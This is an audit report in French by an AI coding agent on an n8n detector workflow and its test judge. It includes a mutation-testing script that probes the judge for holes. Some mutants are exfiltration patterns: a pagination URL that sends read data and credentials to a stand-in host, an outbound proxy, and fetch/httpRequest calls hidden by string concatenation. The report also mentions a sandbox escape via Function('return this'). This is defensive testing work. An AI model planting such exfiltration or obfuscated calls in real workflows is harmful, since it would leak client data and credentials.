# 032-010 — audit offensif du lot L3 (chantier 4, tâche 032-003) : `presti-detecteurs` et son juge

Fait le 02/11/2026 par Claude Code (Opus 5.5), sur le serveur Oracle, hors ligne, en lecture seule. Je n'ai écrit ni le workflow ni le juge.
Rien n'a été modifié hors de ce dossier : aucun appel à n8n ni à Supabase, aucune donnée réelle (identifiants inventés `00000000-0000-4000-8000-…`,
adresses `exemple.invalid`). Les scripts d'attaque ont tourné dans `/tmp/audit-032-010/` ; leur code et leurs sorties sont en annexe.

Réseau neuronal d'abord : `regles_pour` sur « audit des automatisations n8n : détecteurs, relances, factures, offres » (rendus : règle n8n-first,
ADR-003 et ADR-004, `autonomie-abonnements` : `lib/plans.ts` fait foi, Studio prépare et Signature envoie seul, et le motif de l'audit du 08/09 :
« le défaut était dans ce qui devait surveiller le code »). Lu ensuite : plan du chantier 4 §0 et §0 bis (`chantier-4-assistant-plan.md:18-40`,
`:127-150`), `p3-assistant.md` §3.2 et §3.4 (l.552-554), le brief `c4-n8n-detecteurs.md`, `032-003/resume.md`, l'export, le juge.

## Verdict en une ligne

Le **workflow exporté** ne lit aucune donnée personnelle, n'écrit rien, n'envoie rien, cloisonne chaque lecture, et ne propose aucun niveau au-dessus de
l'offre : je n'y ai trouvé **aucun défaut élevé**. Le **juge** en a trois : il reste vert sur une sortie réseau depuis une lecture, sur une facture
au niveau 3 et sur un niveau 3 en Studio. Par la règle de la tâche (« un juge qui reste vert sur l'un de ces cas »), le lot ne tient pas.

VERDICT : NE TIENT PAS

## Ce qui tient (vérifié, pas supposé)

| Point | Preuve |
|---|---|
| 15 lectures HTTP, toutes `GET`, sans corps ni en-tête, URL en dur `https://gorcdvmueakcncsmrouo.supabase.co/rest/v1/<table>` | export, nœuds « Lire … » ; `identifiant.sortie.txt` (annexe C) |
| `select=` : 71 colonnes, chacune trouvée à la ligne de migration que cite le brief | `citations.sh` → 71 `ok`, 0 écart (annexe D) |
| Aucune colonne de nom, adresse, e-mail, texte ; aucun `*`, aucune jointure ; `relances_impayes_arrets.raison` est une énumération (`0159_relances_impayes.sql:62`), `type_chantier` un libellé court déduit par mots-clés (`0026_lead_qualif.sql:5`) | migrations lues |
| Juge rouge sur : colonne `email`, jointure `devis_lignes(*)`, alias `statut:client_email`, filtre de compte retiré, POST ajouté, workflow actif, bilan qui laisse passer les constats | mutants A1-A3, B1, C1, C8, E2 (annexe A) |
| Filtre de compte sur chaque lecture (`artisan_id=in.(…)` des comptes lus ; `stock` par `materiau_id=in.(…)` des matériaux filtrés) ; repli `00000000-…` si aucun compte : jamais de lecture sans filtre | export |
| Comptes de démo exclus (`est_demo=is.false`, colonne `not null default false`, `0068_controle.sql:127`) ; comptes en suppression exclus ; offres Studio, Signature, Entreprise seulement | export, « Lire comptes » |
| Studio ne dépasse jamais 2 (pas d'`assistant.pilote`, `lib/plans.ts:66-100`) ; le n° 5 ne sort rien ; le n° 7 plafonne à 2 ; `creer_facture` est dans `OUTILS_JAMAIS_AUTO` (`lib/pilote/regles.ts:79-82`) et son plafond est 2 ; copie des capacités = `lib/plans.ts` (le juge la compare au code importé) | code du nœud « Niveau proposé selon l offre » l.28-49 ; juge l.151-173 |
| Fuseau de Paris, y compris au changement d'heure du 25/10 | `rejeu.sortie.txt`, deux cas CONFORMES (annexe B) |
| Aucune lecture réelle ne part tant que l'identifiant est mal réglé : « Preuve de connexion » arrête le passage sur la page HTML | `identifiant.sortie.txt` (annexe C) |

## Défauts ÉLEVÉS (3, tous dans le juge `scripts/detecteurs-n8n-qa.mjs`)

### É1 — Le juge reste vert sur une sortie réseau depuis une lecture HTTP (clé et données vers un tiers)

- **Preuve** : mutants C2, C3, C4 → `JUGE VERT (trou)` (annexe A). C2 remplace la pagination de « Lire factures » par `responseContainsNextURL`
  avec `nextURL = 'https://exemple.invalid/collecte?d=' + JSON.stringify($response.body)` : la page suivante part vers un hôte tiers, en GET,
  avec l'identifiant « Supabase account » (les en-têtes `apikey` et `Authorization` d'un identifiant prédéfini accompagnent chaque page) et les
  lignes lues dans l'adresse. C3 pose `options.proxy` ; C4 `allowUnauthorizedCerts`.
- **Pourquoi** : la structure ne regarde que `method`, `sendBody`, `sendHeaders`, `url`, `select=`, les filtres, et seulement le **type** des
  paramètres de pagination (`scripts/detecteurs-n8n-qa.mjs:92-121`, l.119-120) ; `options` n'est jamais comparé. Le mode `responseContainsNextURL`
  n'a pas de `parameters` : la boucle l.120 n'a rien à refuser.
- **Gravité** : élevé (« un envoi possible depuis le workflow » sur lequel le juge reste vert). L'identifiant a « tous les droits » (décision de Benj,
  plan §0, `chantier-4-assistant-plan.md:28-32`) : le juge est la seule barrière.
- **Correctif** : comparer `parameters` et `options` de chaque nœud HTTP à un gabarit **exact** (liste blanche de clés et de valeurs :
  `timeout`, `pagination.paginationMode === 'updateAParameterInEachRequest'`, un seul paramètre `qs`/`offset` à la valeur attendue,
  `completeExpression` exacte, `limitPagesFetched: true`, `maxRequests ≤ 50`) ; toute autre clé (`proxy`, `allowUnauthorizedCerts`, `redirect`,
  `response`, `nextURL`…) rougit. Ajouter les mutants C2, C3, C4 à `MUTANTS`.

### É2 — Le juge reste vert sur une facture au niveau 3 et sur un niveau 3 en Studio

- **Preuve** : mutants D1 (Studio niveau 3 sur le n° 8), D4 (Studio niveau 3 sur le n° 6 en mode « auto »), D2 (`creer_facture` au niveau 3 en
  Entreprise, n° 2), D6 (`creer_facture` au niveau 3 en Signature dès 1 000 € d'acompte, n° 3), D3 (n° 7 au niveau 3 en Entreprise) →
  tous `JUGE VERT (trou)` (annexe A). Le mutant D5 (Studio niveau 3 sur le n° 9) rougit : le cas « 9 Studio au seuil pile » vérifie son niveau.
- **Pourquoi** : les invariants « Studio ≤ 2 », « une facture ne s'émet jamais seule », « geste §3.2 jamais au niveau 3 », « n° 7 jamais 3 »
  (l.345-358) ne tournent que sur **un** jeu (`riche`, l.334-343) où Studio n'a ni n° 8 ni n° 6 au-delà de J+1, où l'Entreprise n'a ni n° 2 ni n° 7,
  et où l'acompte du n° 3 vaut 160 € ; les cas par détecteur ne vérifient le niveau que pour l'offre choisie. Un écart limité à un détecteur ou à une
  offre non tirés passe.
- **Gravité** : élevé, mot pour mot dans la règle du verdict (« un niveau proposé au-dessus de ce que l'offre permet », « une facture qui
  partirait seule », « un juge qui reste vert sur l'un de ces cas »).
- **Correctif** : test par propriété. Pour chaque détecteur × chaque offre (Studio, Signature, Entreprise) × chaque condition du compte
  (impayés cochés ou non, réponse `auto` ou `assistee`) × plusieurs étapes et montants (de 1 € à 100 000 €), fabriquer le cas qui déclenche, puis
  exiger `niveau ≤ plafond(offre, détecteur)`, plafond calculé **dans le juge** à partir de `peut()` (`lib/plans.ts:149`), de
  `OUTILS_JAMAIS_AUTO` et d'une table des plafonds du plan §9 (n° 2, 3, 7, 9, 10 : 2 ; n° 5 : 0). Et `outil ∈ OUTILS_JAMAIS_AUTO ⇒ niveau ≤ 2`
  sur chaque constat de chaque cas, pas du seul jeu riche. Ajouter D1-D4, D6 à `MUTANTS`.

### É3 — Le juge reste vert sur un appel réseau masqué dans un nœud Code, et son rejeu n'est pas un bac à sable

- **Preuve** : mutants C5 (`this['help'+'ers']['http'+'Request'](…)`) et C6 (`Function('return this')()['fe'+'tch']`) → `JUGE VERT (trou)`.
  `evasion-bac-a-sable.mjs` (annexe E), construit comme le rejeu du juge : `regex CODE_INTERDIT voit le code : false` ; le code atteint
  `{"fetch_reel":"function","process_reel":"object","module_fs":"function"}`.
- **Pourquoi** : `CODE_INTERDIT` (l.52) cherche des noms ; une concaténation les cache. Le rejeu (l.177-191) masque des noms par des paramètres
  de `new Function` ; `Function('return this')()` rend le vrai objet global de Node : vrai `fetch`, vrai `process`, accès au disque.
- **Deux conséquences** : (1) dans n8n, un nœud Code ainsi muté appellerait le réseau si l'exécuteur de code de n8n 2.45.6 le permet
  (`this.helpers.httpRequest`, `fetch`) — **non vérifiable hors ligne**, à vérifier sur Oracle ; le juge, lui, est vert dans tous les cas ;
  (2) **certain** : `node scripts/orchestre.mjs verifier` exécute, avec tous les droits du poste, le code de l'export tiré de n8n. Qui peut modifier
  le workflow dans n8n fait tourner son code sur la machine qui lance la vérification.
- **Gravité** : élevé (« un envoi possible depuis le workflow », juge vert) ; (2) est une faille du juge lui-même.
- **Correctif** : (a) épingler dans le juge l'empreinte SHA-256 du `jsCode` de chaque nœud Code ; toute différence rougit et appelle un nouvel audit
  par un agent distinct (le texte du code devient la chose jugée, pas un motif) ; (b) rejouer le code dans un **processus enfant** lancé avec
  `node --permission` (aucune écriture disque, aucun processus enfant, aucun worker), sans objet de l'hôte passé au code (`node:vm` seul ne suffit
  pas : un objet de l'hôte passé au contexte donne `constructor.constructor` → l'hôte) ; (c) sur Oracle, vérifier et noter dans le brief ce que
  l'exécuteur de code de n8n permet (réseau, modules : variables `NODE_FUNCTION_ALLOW_*`, exécuteurs de tâches).

## Défauts MOYENS (pour le lot L12)

| # | Défaut | Preuve | Correctif |
|---|---|---|---|
| M1 | **Juge vert sur des filtres neutralisés** : `artisan_id = ={{ 'not.is.null' }}` (toute expression passe la regex l.116) ; `est_demo` retiré (les comptes de démo entrent au bilan, contre l'invariant zéro-démo) ; `suppression_demandee_le` retiré (comptes qui ont demandé leur effacement) ; `plan=in.(…)` retiré ; filtre du `stock` retiré (`stock` est exempté l.118) | mutants B2-B6 verts | gabarit exact par nœud : noms **et valeurs** attendus des paramètres de requête, y compris les trois filtres de « Lire comptes » et le texte de l'expression `in.(…)` |
| M2 | **Constat qui mêle deux comptes sur données incohérentes** : le n° 2 additionne les factures par `devis_id` sans regarder leur compte (nœud n° 2, l.29) ; le n° 1 lit le journal par `facture_id` seul (l.38) ; n° 3 (l.26) et n° 7 (l.26) de même. La base ne l'interdit pas (`chantiers.devis_id` et `factures.devis_id` : simples clés étrangères, `0141_crm_atelier.sql:64`, `0006_factures.sql:13`). Le juge ne teste aucune donnée croisée et reste vert si l'on retire les gardes des n° 2 et n° 9 | `rejeu` : une facture du compte B sur le devis de A fait passer le reste de A de 200 000 à 150 000 centimes ; mutants B7, B8 verts | indexer par `(artisan_id, id)` partout ; cas croisés dans le juge |
| M3 | **Le niveau 3 annoncé ne dit pas ce qui partirait** : il ignore les portes du pilote (`decisionPilote`, `lib/pilote/regles.ts:237-255` : pilote activé, type activé, plafond de 20 par jour, drapeau), la pause et la suspension du compte (`lib/relancesImpayesMagasin.ts:30-35`), le canal et la prise en main d'une demande (`lib/pilote/serveur.ts`, `piloterProposition`), le sujet d'escalade (§3.2, `p3-assistant.md:553` : n8n ne lit aucun texte, il ne peut pas le savoir). Pas élevé aujourd'hui : rien n'est écrit, et l'app redécide avant tout départ ; **élevé** le jour où n8n agirait sur son propre niveau 3 | `rejeu` : n° 4 en Signature, pilote jamais activé → n8n niveau 3, l'app `{"auto":false,"motif":"inactif"}` ; n° 6 en mode auto → niveau 3 sur une demande de 200 jours | lire `pilote_reglages`, `artisans.leads_pause` (accordé à `n8n_lecture`, `0189_role_lecture_n8n.sql:38`), les suspensions ; appeler le niveau « 3 possible, sous réserve du pilote » ; écrire noir sur blanc que n8n n'envoie jamais sur son niveau |
| M4 | **n° 7 et n° 6 ratent des statuts réels** : le n° 7 attend `en_cours`, qui n'existe pas, et oublie `en_discussion` (nœud n° 7, l.28) ; le n° 6 ne voit que `nouveau` (l.26-27). Statuts de l'app : `nouveau, en_discussion, repondu, gagne, perdu` (`lib/assistant/outils-actions.ts:42`) ; `en_discussion` = le client a écrit, la balle est chez l'artisan (`lib/canaux/rangement.ts:47-50`) ; statut vide = non lue (`lib/assistant/donnees.ts:197`) | `rejeu` : quatre ÉCARTS (en_discussion et vide, n° 6 et n° 7) | `ouvertes = ['nouveau', 'en_discussion', 'repondu', null]` ; n° 6 sur `nouveau`, `en_discussion` et vide ; cas au juge |
| M5 | **Double relance et double compte** : le même devis déclenche le n° 4 (`j7`) et le n° 8 (`expire`) le même jour, deux `relancer_devis` au niveau 3 ; le bilan compte 300 000 centimes pour un devis de 1 500 €. Le n° 2 et le n° 3 comptent 260 000 centimes sur un devis de 2 000 € | `rejeu`, trois ÉCARTS | un seul constat de relance par devis et par jour (le n° 8 l'emporte ou fusionne) ; bilan par objet distinct, et un total d'« argent qui dort » qui ne compte pas deux fois |
| M6 | **n° 1 relance le lendemain d'une relance** : il ne lit pas `relances_impayes.jour` et n'applique pas l'écart minimal de 2 jours (`ECART_MIN`, `lib/relancesImpayes.ts:26`, règle `decider` l.228) | `rejeu` : rang 1 parti hier → n8n `j10` niveau 3 ; `decider` : `{"action":"rien","raison":"trop_tot"}` | lire `jour` (accordé, `0189_role_lecture_n8n.sql:49`) et appliquer `ECART_MIN` |
| M7 | **n° 10 diverge de `propositions`** (`lib/apresChantier.ts:132-149`) : il prend `maj_le` quand la date de fin réelle manque (l'app ne propose rien), et borne à 2-16 jours d'aujourd'hui au lieu de « fini après l'activation − 14 jours » ; il ne lit pas les rappels déjà posés (`crm_rappels`, clé `avis:<chantier>`) | `rejeu`, deux ÉCARTS | supprimer le repli `maj_le` (nœud n° 10, l.29 ; même repli au n° 2, l.43) ; lire `crm_apres_chantier.actif_depuis` et `crm_rappels` (accordés, `0189_role_lecture_n8n.sql:50`, `:52`) |
| M8 | **Seuils sans source (n° 6 : 1 et 3 jours ; n° 8 : 7 jours) : trompent-ils l'artisan ?** n° 6 **oui** : sans borne haute, une demande morte depuis 200 jours reste un « client qui attend » chaque matin (et passe au niveau 3 en Signature « auto ») ; « 1 jour » se compte en jours de Paris, soit 7 h 15 pour une demande reçue à 23 h 30. n° 8 : 7 jours est raisonnable mais il **rate le dernier jour** (reste 0, devis encore valable selon `devisDepasse`, `lib/comptaTableau.ts:178-185`) ; et le briefing de l'assistant dit qu'un devis mérite une relance à 7 jours (`lib/assistant/briefing.ts:35`) quand le n° 4 relance à J+3 : deux chiffres pour la même chose | `rejeu`, deux ÉCARTS | borne haute au n° 6 (par exemple la fenêtre des relances de conversation, `lib/relances.ts`), `restant < 0` au n° 8, et un seul seuil « devis sans réponse » pour l'app et n8n, à faire trancher par Benj |
| M9 | **n° 9 : une commande quelconque sur le chantier vaut couverture** (nœud n° 9, l.32), là où l'app ne tient pour couvert que le **matériau** commandé (`lib/crm/alertes.ts:97-98`, `:114`). Écart déclaré par 032-003, mais il fait taire une vraie rupture | lecture du code | vue `commande_lignes(materiau_id)` sans texte (migration, « go ») |
| M10 | **Juge vert sur `alwaysOutputData` retiré et sur un workflow d'erreur branché** : son rejeu donne `[{}]` à toute table vide (l.204-205), alors que n8n arrête la chaîne si une lecture rend zéro ligne sans cette option (fréquent : aucune commande `commandee`) ; `settings.errorWorkflow` n'est pas regardé | mutants C9, C7 verts | exiger `alwaysOutputData: true` sur les 14 lectures concernées ; liste blanche de `settings` |
| M11 | **Juge vert sur un constat qui porte une coordonnée sous un nom neutre** (`destinataire`, `tel`) : le contrôle des champs est une liste noire (l.50, l.350-354). Pas élevé : aucune colonne personnelle ne peut être lue (le `select=` est en liste blanche), la valeur ne peut venir que du code | mutants E1, E2b verts | liste blanche exacte des clés d'un constat (`numero, detecteur, cle, artisan_id, objet.type, objet.id, etape, montant_centimes, jours, offre, niveau, outil, drapeaux`) |
| M12 | **Identifiant « Supabase account » (constat de 032-003, point 6)** : vérifié dans l'export, sans clé lue. Les 16 nœuds (le nœud Supabase et les 15 HTTP) portent le même identifiant `dTewDK98MLrNckNG` ; l'export n'a ni hôte ni clé ; les 15 lectures HTTP ont l'adresse du projet **en dur** et ne dépendent pas de l'hôte ; seul le nœud Supabase en dépend. **Tant que l'hôte n'est pas corrigé**, le workflow voit une page HTML, « Preuve de connexion » arrête le passage avant toute lecture : aucun bilan, et ni branche d'erreur ni `errorWorkflow` pour le dire (seule la liste des exécutions de n8n le montre). Et chaque passage envoie la clé de l'identifiant à cet hôte (déjà fait une fois, exécution 319). La preuve de connexion est faible : un hôte qui rend `[]`, ou un autre projet Supabase qui a la même table, passe « ok » | `identifiant.sortie.txt` (annexe C) | Benj : corriger l'hôte (geste de compte) et dire quel hôte y était ; **s'il n'est pas un domaine de Supabase, faire tourner la clé** (alors élevé, hors du lot). Côté workflow : branche d'erreur au lot L12 (déjà prévue) ; prouver l'hôte par une lecture HTTP en dur plutôt que par le nœud Supabase |

## Défauts FAIBLES

- F1 — Les exécutions gardent tout (pas de `saveDataSuccessExecution` dans `settings`) : la ligne entière de `regles_automatisation` (dont
  `maillons`, un JSON sans forme imposée, aujourd'hui des booléens et des nombres : `lib/regles.ts:44-67`) et les identifiants et montants de tous
  les comptes restent dans la base de n8n d'Oracle. À inscrire au registre (section prévue au plan §0 bis) ou à ne pas garder (`'none'`).
- F2 — `settings.availableInMCP: true` : le workflow est offert aux clients MCP de l'instance ; inutile ici, à mettre à `false` (le juge l'ignore).
- F3 — Les comptes fondateurs se lisent par la colonne `plan`, alors que le pilote les traite en Business (`lib/pilote/serveur.ts:48-51`) ; ils
  entrent au bilan s'ils portent `studio` ou `signature`.
- F4 — Filtre `in.(…)` dans l'adresse : 37 caractères par compte, refus probable au-delà de quelques centaines (déclaré par 032-003).
- F5 — Le juge n'est pas dans `SUITES` de `scripts/tout-verifier.mjs` (déclaré par 032-003) : personne ne le rejoue.
- F6 — `p3-assistant.md` §3.4 veut « une clé de service dédiée, à droits limités » ; le plan §0 note que Benj a voulu un identifiant à tous les
  droits. La décision la plus récente l'emporte, mais elle fait du juge la seule barrière : raison de plus pour É1-É3.

## Ce qu'il faut pour que le lot tienne

É1, É2 et É3 corrigés dans le juge, les mutants de l'annexe A ajoutés à `MUTANTS`, puis un nouvel audit par un agent distinct. Le workflow peut
rester tel quel pour ces trois points ; M1 à M12 vont au lot L12, avec M3, M4 et M12 en premier.

## Annexes

Les scripts ont tourné depuis `/home/usine/Documents/presti` ; le juge a été copié dans une racine factice (`/tmp/audit-032-010/racine/`, dont
`lib` est un lien vers celui du dépôt) pour lui donner des exports mutés sans toucher à celui du dépôt ; la racine factice a retrouvé l'export intact
à la fin (`cmp` : identique). Le juge du dépôt, rejoué sur l'export du dépôt, rend `OK`.

### Annexe A — mutants contre le juge : code (`/tmp/audit-032-010/attaque/mutants.mjs`)

```js
// 032-010 — mutants de l'auditeur contre le juge scripts/detecteurs-n8n-qa.mjs (hors ligne, hors dépôt).
// Chaque mutant écrit une copie modifiée de l'export dans une racine factice, puis rejoue une COPIE du juge dessus.
// Le juge doit rougir (code ≠ 0) ; un mutant qui le laisse vert (code 0) est un trou.
// Lancement (depuis le dépôt, pour le chargeur TS) :
//   node /tmp/audit-032-010/attaque/mutants.mjs
import { readFileSync, writeFileSync } from 'node:fs'
import { spawnSync } from 'node:child_process'

const DEPOT = '/home/usine/Documents/presti'
const ORIGINAL = DEPOT + '/.orchestre/preuves/032-003/presti-detecteurs.workflow.json'
const CIBLE = '/tmp/audit-032-010/racine/.orchestre/preuves/032-003/presti-detecteurs.workflow.json'
const JUGE = '/tmp/audit-032-010/racine/scripts/detecteurs-n8n-qa.mjs'
const WF = JSON.parse(readFileSync(ORIGINAL, 'utf8'))
const copie = (o) => JSON.parse(JSON.stringify(o))
const noeud = (wf, nom) => wf.nodes.find((n) => n.name === nom)
const param = (n, nom) => n.parameters.queryParameters.parameters.find((q) => q.name === nom)
const code = (wf, nom, de, vers) => { const n = noeud(wf, nom); if (!n.parameters.jsCode.includes(de)) throw new Error('introuvable : ' + de); n.parameters.jsCode = n.parameters.jsCode.replace(de, vers) }

const MUTANTS = [
  // ── Ce que n8n lit ──
  ['A1 colonne email ajoutée au select= (factures.client_email)', (w) => { param(noeud(w, 'Lire factures'), 'select').value += ',client_email' }],
  ['A2 jointure PostgREST (devis, lignes(*))', (w) => { param(noeud(w, 'Lire devis'), 'select').value += ',devis_lignes(*)' }],
  ['A3 alias qui renomme une coordonnée (statut:client_email)', (w) => { const p = param(noeud(w, 'Lire factures'), 'select'); p.value = p.value.replace('statut', 'statut:client_email') }],
  // ── Le cloisonnement ──
  ['B1 filtre de compte retiré (factures)', (w) => { const n = noeud(w, 'Lire factures'); n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'artisan_id') }],
  ['B2 filtre de compte neutralisé par une expression (artisan_id=not.is.null)', (w) => { param(noeud(w, 'Lire factures'), 'artisan_id').value = "={{ 'not.is.null' }}" }],
  ['B3 comptes de démo réintégrés (est_demo=is.false retiré)', (w) => { const n = noeud(w, 'Lire comptes'); n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'est_demo') }],
  ['B4 comptes en suppression RGPD réintégrés (suppression_demandee_le retiré)', (w) => { const n = noeud(w, 'Lire comptes'); n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'suppression_demandee_le') }],
  ['B5 filtre de offre retiré (plan=in.(…) retiré : gratuit, essentiel, business lus)', (w) => { const n = noeud(w, 'Lire comptes'); n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'plan') }],
  ['B6 stock lu pour tous les comptes (filtre materiau_id retiré)', (w) => { const n = noeud(w, 'Lire stock'); n.parameters.queryParameters.parameters = n.parameters.queryParameters.parameters.filter((q) => q.name !== 'materiau_id') }],
  ['B7 garde inter-comptes du n° 2 retirée (chantier de A sur devis de B)', (w) => code(w, 'Détecteur 02 chantier à facturer', 'if (!d || d.artisan_id !== c.artisan_id || aSolde(d)) continue;', 'if (!d || aSolde(d)) continue;')],
  ['B8 garde inter-comptes du n° 9 retirée (réservation de A sur chantier de B)', (w) => code(w, 'Détecteur 09 stock sous le seuil', "if (!c || c.artisan_id !== r.artisan_id || c.statut === 'termine'", "if (!c || c.statut === 'termine'")],
  // ── Écrire, envoyer, appeler ──
  ['C1 nœud HTTP d’écriture ajouté (POST)', (w) => { const n = copie(noeud(w, 'Lire tarifs')); n.name = 'Ecrire'; n.parameters.method = 'POST'; w.nodes.push(n) }],
  ['C2 pagination « next URL » vers un hôte tiers, avec l’identifiant (les lectures y partent)', (w) => {
    const pg = noeud(w, 'Lire factures').parameters.options.pagination.pagination
    pg.paginationMode = 'responseContainsNextURL'; delete pg.parameters
    pg.nextURL = "={{ 'https://exemple.invalid/collecte?d=' + encodeURIComponent(JSON.stringify($response.body)) }}"
    pg.paginationCompleteWhen = 'other'; pg.completeExpression = '={{ $pageCount >= 1 }}'
  }],
  ['C3 proxy sortant sur une lecture (clé et données passent par un tiers)', (w) => { noeud(w, 'Lire factures').parameters.options.proxy = 'http://exemple.invalid:8080' }],
  ['C4 certificats non vérifiés (interception possible)', (w) => { noeud(w, 'Lire factures').parameters.options.allowUnauthorizedCerts = true }],
  ['C5 appel réseau masqué dans un nœud Code (this[\'help\'+\'ers\'][\'http\'+\'Request\'])', (w) => code(w, 'Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); const h = (typeof this === 'object' && this) ? this['help' + 'ers'] : null; if (h && h['http' + 'Request']) h['http' + 'Request']({ url: 'https://exemple.invalid' });")],
  ['C6 fetch masqué dans un nœud Code (globalThis par Function)', (w) => code(w, 'Bilan par détecteur', 'const vues = new Set();', "const vues = new Set(); const f = Function('return this')()['fe' + 'tch']; void f;")],
  ['C7 workflow d’erreur branché (settings.errorWorkflow)', (w) => { w.settings.errorWorkflow = 'AutreWorkflowQuiPosteSurSlack' }],
  ['C8 workflow actif', (w) => { w.active = true }],
  ['C9 lecture qui ne rend plus d’élément vide (alwaysOutputData retiré) : la chaîne s’arrête en silence', (w) => { delete noeud(w, 'Lire commandes').alwaysOutputData }],
  // ── Les niveaux ──
  ['D1 niveau 3 en Studio sur le n° 8 seulement', (w) => code(w, 'Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 8 && l.includes('relances'))) n = 3;")],
  ['D2 facture (creer_facture) au niveau 3 en Entreprise, n° 2', (w) => code(w, 'Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 2 && l.includes('organisation.membres')) ? 3 : niveau,")],
  ['D3 n° 7 au niveau 3 en Entreprise', (w) => code(w, 'Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 7 && l.includes('organisation.membres')) ? 3 : niveau,")],
  ['D6 facture d’acompte (creer_facture) au niveau 3 en Signature dès 50 % d’acompte', (w) => code(w, 'Niveau proposé selon l offre', 'offre: comptes.get(c.artisan_id).plan, niveau,', "offre: comptes.get(c.artisan_id).plan, niveau: (c.numero === 3 && c.montant_centimes >= 100000 && l.includes('assistant.pilote')) ? 3 : niveau,")],
  ['D4 niveau 3 en Studio quand la réponse est en mode « auto » (n° 6)', (w) => code(w, 'Niveau proposé selon l offre', 'if (peutPartirSeul) n = 3;', "if (peutPartirSeul || (c.numero === 6 && modeAuto.has(c.artisan_id) && !l.includes('crm') && c.jours >= 3)) n = 3;")],
  ['D5 Studio niveau 3 sur le n° 9 (stock, CRM absent)', (w) => code(w, 'Niveau proposé selon l offre', 'return Math.min(n, d.max);', "return (c.numero === 9 && c.objet.type === 'materiau') ? 3 : Math.min(n, d.max);")],
  // ── Constats ──
  ['E1 constat qui porte une adresse sous un nom neutre (destinataire)', (w) => code(w, 'Détecteur 04 devis sans réponse', 'return [{ json: { constats: avant.concat(nouveaux) } }];', "for (const x of nouveaux) x.destinataire = 'client@exemple.invalid'; return [{ json: { constats: avant.concat(nouveaux) } }];")],
  ['E2b constat qui porte un téléphone (tel)', (w) => code(w, 'Détecteur 06 demande sans réponse', 'return [{ json: { constats: avant.concat(nouveaux) } }];', "for (const x of nouveaux) x.tel = '0600000000'; return [{ json: { constats: avant.concat(nouveaux) } }];")],
  ['E2 bilan qui laisse passer la liste des constats', (w) => code(w, 'Bilan par détecteur', 'mode: ctx.mode', 'mode: ctx.mode, detail: l')],
]

const resultats = []
const filtre = process.argv[2] ? new RegExp(process.argv[2]) : null
for (const [titre, f] of MUTANTS) {
  if (filtre && !filtre.test(titre)) continue
  const m = copie(WF)
  try { f(m) } catch (e) { resultats.push([titre, 'MUTANT INAPPLICABLE : ' + e.message]); continue }
  writeFileSync(CIBLE, JSON.stringify(m, null, 2))
  const r = spawnSync(process.execPath, ['--experimental-strip-types', '--no-warnings', '--import', './scripts/ts-loader.mjs', JUGE], { cwd: DEPOT, encoding: 'utf8', env: { ...process.env, NODE_OPTIONS: '' } })
  const lignes = (r.stdout + r.stderr).split('\n').filter((l) => /^\s+✗ (?!mutant)/.test(l) || /^(OK|ÉCHEC)$/.test(l))
  resultats.push([titre, r.status === 0 ? 'JUGE VERT (trou)' : 'juge rouge', lignes.slice(0, 3).join(' | ')])
}
writeFileSync(CIBLE, readFileSync(ORIGINAL, 'utf8')) // la racine factice retrouve l'export intact
for (const [t, v, d] of resultats) console.log(`${v.padEnd(18)} ${t}${d ? '\n                   ' + d.slice(0, 220) : ''}`)
console.log(`\n${resultats.filter((r) => r[1].startsWith('JUGE VERT')).length} mutant(s) sur ${resultats.length} laissent le juge vert`)
```

### Annexe A — sortie (`node /tmp/audit-032-010/attaque/mutants.mjs`)

```text
juge rouge         A1 colonne email ajoutée au select= (factures.client_email)
                     ✗ Lire factures : colonne factures.client_email hors de la liste permise |   ✗ Lire factures : colonne interdite factures.client_email | ÉCHEC
juge rouge         A2 jointure PostgREST (devis, lignes(*))
                     ✗ Lire devis : colonne devis.devis_lignes(*) hors de la liste permise | ÉCHEC
juge rouge         A3 alias qui renomme une coordonnée (statut:client_email)
                     ✗ Lire factures : colonne factures.statut:client_email hors de la liste permise |   ✗ Lire factures : colonne interdite factures.statut:client_email | ÉCHEC
juge rouge         B1 filtre de compte retiré (factures)
                     ✗ Lire factures : lecture non filtrée par compte | ÉCHEC
JUGE VERT (trou)   B2 filtre de compte neutralisé par une expression (artisan_id=not.is.null)
                   OK
JUGE VERT (trou)   B3 comptes de démo réintégrés (est_demo=is.false retiré)
                   OK
JUGE VERT (trou)   B4 comptes en suppression RGPD réintégrés (suppression_demandee_le retiré)
                   OK
JUGE VERT (trou)   B5 filtre de offre retiré (plan=in.(…) retiré : gratuit, essentiel, business lus)
                   OK
JUGE VERT (trou)   B6 stock lu pour tous les comptes (filtre materiau_id retiré)
                   OK
JUGE VERT (trou)   B7 garde inter-comptes du n° 2 retirée (chantier de A sur devis de B)
                   OK
JUGE VERT (trou)   B8 garde inter-comptes du n° 9 retirée (réservation de A sur chantier de B)
                   OK
juge rouge         C1 nœud HTTP d’écriture ajouté (POST)
                     ✗ 15 lectures HTTP attendues (16) |   ✗ Ecrire : méthode POST interdite (GET seulement) | ÉCHEC
JUGE VERT (trou)   C2 pagination « next URL » vers un hôte tiers, avec l’identifiant (les lectures y partent)
                   OK
JUGE VERT (trou)   C3 proxy sortant sur une lecture (clé et données passent par un tiers)
                   OK
JUGE VERT (trou)   C4 certificats non vérifiés (interception possible)
                   OK
JUGE VERT (trou)   C5 appel réseau masqué dans un nœud Code (this['help'+'ers']['http'+'Request'])
                   OK
JUGE VERT (trou)   C6 fetch masqué dans un nœud Code (globalThis par Function)
                   OK
JUGE VERT (trou)   C7 workflow d’erreur branché (settings.errorWorkflow)
                   OK
juge rouge         C8 workflow actif
                     ✗ le workflow doit être inactif (active: false) | ÉCHEC
JUGE VERT (trou)   C9 lecture qui ne rend plus d’élément vide (alwaysOutputData retiré) : la chaîne s’arrête en silence
                   OK
JUGE VERT (trou)   D1 niveau 3 en Studio sur le n° 8 seulement
                   OK
JUGE VERT (trou)   D2 facture (creer_facture) au niveau 3 en Entreprise, n° 2
                   OK
JUGE VERT (trou)   D3 n° 7 au niveau 3 en Entreprise
                   OK
